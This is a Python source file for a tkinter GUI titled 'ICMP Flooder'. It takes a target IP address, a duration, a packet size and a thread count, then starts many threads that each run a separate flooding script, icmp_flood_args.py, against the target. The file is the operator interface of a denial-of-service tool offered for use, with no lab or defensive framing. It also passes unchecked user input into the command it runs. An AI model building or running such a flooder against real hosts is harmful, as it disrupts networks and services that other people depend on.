import tkinter as tk
import subprocess
import threading

root = tk.Tk()
root.title('ICMP Flooder')
root.resizable(False, False)

def send_ping():
    ip_dest = entry_ip_dest.get()
    duration = int(entry_duration.get())
    sent_buff_size = int(entry_sent_buff_size.get())
    num_threads = int(entry_num_threads.get())

    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=send_ping_thread, args=(ip_dest,duration,sent_buff_size))
        threads.append(thread)
        thread.start()

    print('\nRunning...')

    for thread in threads:
        thread.join()

def send_ping_thread(ip_dest,duration,sent_buff_size):
    subprocess.run(f"python icmp_flood_args.py -target {ip_dest} -duration {duration} -size {sent_buff_size}", stdout=subprocess.DEVNULL)

label_ip_dest = tk.Label(root, text='IP address:')
entry_ip_dest = tk.Entry(root)

label_duration = tk.Label(root, text='Duration (s):')
entry_duration = tk.Entry(root)

label_sent_buff_size = tk.Label(root, text='Sent buffer size (bytes):')
entry_sent_buff_size = tk.Entry(root)

label_num_threads = tk.Label(root, text='Number of threads:')
entry_num_threads = tk.Entry(root)

label_ip_dest.pack()
entry_ip_dest.pack()

label_duration.pack()
entry_duration.pack()

label_sent_buff_size.pack()
entry_sent_buff_size.pack()

label_num_threads.pack()
entry_num_threads.pack()

button = tk.Button(root, text='Start Flood', command=send_ping)
button.pack()

root.mainloop()